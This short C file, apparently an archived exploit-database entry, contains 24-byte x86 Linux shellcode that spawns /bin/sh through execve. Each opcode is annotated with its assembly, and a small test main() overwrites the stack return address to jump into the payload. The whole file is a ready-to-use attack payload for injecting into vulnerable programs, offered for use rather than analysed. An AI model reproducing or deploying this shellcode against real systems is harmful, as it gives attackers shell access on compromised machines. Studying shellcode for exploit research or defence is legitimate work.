/*
 * s0t4ipv6@shellcode.com.ar
 *
 * execve(/bin/sh).
 *
 * 24 bytes. es lo mas chica que se puede hacer.
 *
*/
char shellcode[]=
"\x31\xc0"                      // xorl         %eax,%eax
"\x50"                          // pushl        %eax
"\x68\x6e\x2f\x73\x68"          // pushl        $0x68732f6e
"\x68\x2f\x2f\x62\x69"          // pushl        $0x69622f2f
"\x89\xe3"                      // movl         %esp,%ebx
"\x99"                          // cltd
"\x52"                          // pushl        %edx
"\x53"                          // pushl        %ebx
"\x89\xe1"                      // movl         %esp,%ecx
"\xb0\x0b"                      // movb         $0xb,%al
"\xcd\x80"                      // int          $0x80
;

main() {
        int *ret;
        ret=(int *)&ret+2;
        printf("Shellcode lenght=%d\n",strlen(shellcode));
        (*ret) = (int)shellcode;
}

// milw0rm.com [2004-09-12]